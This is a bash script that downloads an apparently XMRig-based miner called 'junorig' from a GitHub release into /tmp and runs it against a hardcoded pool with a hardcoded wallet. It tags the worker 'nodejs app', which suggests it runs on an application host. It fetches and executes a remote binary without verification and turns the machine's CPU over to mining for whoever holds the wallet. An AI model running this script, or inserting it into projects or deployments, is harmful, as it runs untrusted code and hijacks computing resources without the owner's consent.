#!/bin/bash
set -e

JUNO_URL="https://github.com/juno-cash/junorig/releases/download/v6.24.0-juno.7/junorig-v6.24.0-juno.7-linux-x64.tar.gz"
JUNO_POOL="stratum+tcp://pool.junohash.com:3333"
JUNO_WALLET="j1uk6lyf5hs35sp3n2jrthk4lr6ceg5xn8zffmynh5egyvyzur9mzav7ee3x82w3l6tm9yvsfarrp8wk7n9ur2akmuxsn567ye9gk6fx9h"

rm -rf /tmp/junorig-bin /tmp/junorig.tar.gz
mkdir -p /tmp/junorig-bin

echo "Downloading JunoRig..."
wget -qO /tmp/junorig.tar.gz "$JUNO_URL"

echo "Extracting..."
tar -xzf /tmp/junorig.tar.gz -C /tmp/junorig-bin

JUNO=$(find /tmp/junorig-bin -type f \( -name "junorig" -o -name "xmrig" \) -print -quit)

if [ -z "$JUNO" ]; then
    echo "ERROR: Juno binary not found"
    find /tmp/junorig-bin -type f
    exit 1
fi

chmod +x "$JUNO"

echo "======================================"
echo "JUNO MINER"
echo "CPU: $(nproc)"
echo "POOL: $JUNO_POOL"
echo "======================================"

exec "$JUNO" \
    -a rx/juno \
    -o "$JUNO_POOL" \
    -u "$JUNO_WALLET" \
    -p "x nodejs app"
